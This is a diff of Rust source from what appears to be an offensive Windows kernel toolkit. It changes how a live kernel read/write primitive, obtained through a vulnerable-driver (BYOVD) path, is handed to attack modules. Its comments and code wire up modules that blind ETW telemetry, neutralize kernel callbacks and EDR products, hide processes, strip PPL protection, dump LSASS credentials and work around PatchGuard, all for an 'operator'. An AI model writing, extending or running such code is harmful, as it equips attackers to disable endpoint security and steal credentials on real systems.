@@ -424,12 +424,11 @@ pub fn select_pg_window(
     }
 }
 
-/// Assemble a full [`KernelTier`] from a resolved `KernelBootstrap` + offsets.
+/// Assemble a full [`KernelTier`] by consuming a resolved `KernelBootstrap`.
 ///
-/// This is the operational composition point: it takes the kernel R/W primitive
-/// (from `bootstrap_chain`), the resolved runtime offsets (from `resolve_offsets`),
-/// the EPROCESS offsets (from the build table), and wires up every kit that has
-/// a real implementation:
+/// This is the operational composition point. It **takes ownership** of the
+/// bootstrap (by value), moves the real `KernelRw` primitive into `tier.rw`,
+/// and wires up every kit that has a real implementation + resolved offsets:
 ///
 /// - **ETW-TI blind** — `EtwTiBlind` (needs `etw_ti_handle_kva` + `EtwTiOffsets`)
 /// - **Callback neutralize** — `CallbackNeutralizer` (needs notify-array KVAs)
@@ -437,8 +436,16 @@ pub fn select_pg_window(
 /// - **Process hide** — `ProcessHider` (needs `ps_active_process_head_kva` + EPROCESS offsets)
 /// - **PPL strip/immortal** — `PplStripper` (same as ProcessHider)
 /// - **LSASS dump** — `KernelLsassReader` (needs `ps_active_process_head_kva` + EPROCESS offsets)
-/// - **PatchGuard window** — via [`select_pg_window`] (stored as a factory because
-///   the PG window borrows `&dyn KernelRw` and cannot be owned in `KernelTier`)
+/// - **WFP silencer** — `UserModeEdrSilencer` (zero-field, always wired)
+/// - **EDR neutralize** — `EdrNeutralizer` (Freeze/Choke user-mode FFI; Kill via separate call)
+///
+/// PatchGuard windows are NOT in the tier (they borrow `&dyn KernelRw` for their
+/// repair callback). Use `select_pg_window(build, &*tier.rw)` at the call site.
+///
+/// After this call, `tier.rw.kread()` / `tier.rw.kwrite()` are LIVE — the real
+/// kernel primitive (KslD or BYOVD) is owned by the tier. The BYOVD `LoadedDriver`
+/// is stored in `tier.loaded_driver` for explicit `unload()` when the operator
+/// is done.
 ///
 /// Kits whose required offsets are unresolved (KVA == 0) are left as `None` and
 /// degrade cleanly — the operator can check `tier.minifilter.is_some()` etc.
@@ -447,23 +454,20 @@ pub fn select_pg_window(
 /// All kits read/write kernel memory when invoked. The assembly itself is pure
 /// struct construction — no kernel access until a kit method is called.
 pub fn assemble_tier(
-    bootstrap: &KernelBootstrap,
+    bootstrap: KernelBootstrap,
     runtime: &crate::offsets::RuntimeOffsets,
     eprocess: crate::offsets::EprocessOffsets,
     etw_ti_offsets: crate::etwti::EtwTiOffsets,
     _build: u32,
 ) -> KernelTier {
-    let krw: Box<dyn KernelRw> = match bootstrap {
-        KernelBootstrap::KslD(_) | KernelBootstrap::Byovd(_, _) => {
-            // We can't move the KernelRw out of the borrowed bootstrap (KslD/
-            // ByovdDriver own it). KernelTier needs an owned Box. The caller
-            // owns `bootstrap` and passes `&dyn KernelRw` to kit methods at
-            // call time. We store a NoKernel floor here and expose the real
-            // krw via the PG factory + call-site borrows.
-            //
-            // The tier's `rw` field is the floor; real kernel access happens
-            // through the borrowed `bootstrap.as_kernel_rw()` at the call site.
-            Box::new(crate::NoKernel)
+    // Destructure the bootstrap to extract the live KernelRw + optional driver.
+    let (krw, loaded_driver): (Box<dyn KernelRw>, Option<Box<dyn Send + Sync>>) = match bootstrap {
+        KernelBootstrap::KslD(defender) => (Box::new(defender), None),
+        KernelBootstrap::Byovd(loaded, driver) => {
+            // Both `loaded` (LoadedDriver) and `driver` (ByovdDriver) are
+            // Send+Sync. Store the LoadedDriver for explicit unload; move the
+            // ByovdDriver (which IS the KernelRw) into the tier.
+            (Box::new(driver), Some(Box::new(loaded)))
         }
     };
 
@@ -522,10 +526,6 @@ pub fn assemble_tier(
         None
     };
 
-    // PG window: can't be owned (borrows &dyn KernelRw), so leave None here.
-    // The caller uses `select_pg_window(_build, bootstrap.as_kernel_rw())` at the
-    // point of use — see `select_pg_window` above.
-
     // WFP silencer — `UserModeEdrSilencer` is a zero-field unit struct that
     // resolves FwpmEngineOpen0 from fwpuclnt.dll at call time (no offsets, no
     // kernel handle). It's always available on Windows with admin rights, so
@@ -551,10 +551,10 @@ pub fn assemble_tier(
         callbacks,
         minifilter,
         wfp,
-        pg: None, // see select_pg_window() — borrows KernelRw, can't be owned.
         hide,
         ppl,
         cred,
         neutralize,
+        loaded_driver,
     }
 }
